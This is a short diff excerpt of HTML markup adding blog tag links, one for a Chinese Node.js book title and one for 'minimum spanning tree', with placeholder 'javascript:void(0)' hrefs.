+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color5">《了不起的Node JS 将JavaScript进行到底》</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag color1">最小生成树</a>
               </li>
             
             <div class="clearfix"></div>
